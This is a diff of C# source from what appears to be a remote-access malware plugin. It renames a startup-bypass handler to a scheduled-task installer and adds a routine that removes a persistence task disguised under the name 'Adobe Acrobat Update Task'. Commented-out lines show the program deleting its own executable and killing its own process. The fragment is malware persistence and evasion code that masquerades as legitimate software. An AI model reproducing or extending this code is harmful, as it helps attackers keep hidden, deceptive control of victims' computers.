@@ -11,7 +11,7 @@ using System.Windows.Forms;
 
 namespace Plugin.Handler
 {
-    class HandleStartBypass
+    class HandleSchtaskInstall
     {
         public static void AddStartUp()
         {
@@ -39,6 +39,21 @@ namespace Plugin.Handler
                 //string s = Process.GetCurrentProcess().MainModule.FileName;
                 //Process.Start("Cmd.exe", "/c del " + "\"" + s + "\"");
                 //Process.GetCurrentProcess().Kill();
+            }
+            catch (Exception ex)
+            {
+                Packet.Error(ex.Message);
+            }
+
+        }
+        public static void DelStartUp()
+        {
+            try
+            {
+                using (TaskService _taskService = new TaskService())
+                {
+                    _taskService.RootFolder.DeleteTask(@"Adobe Acrobat Update Task", false);
+                }
             }
             catch (Exception ex)
             {
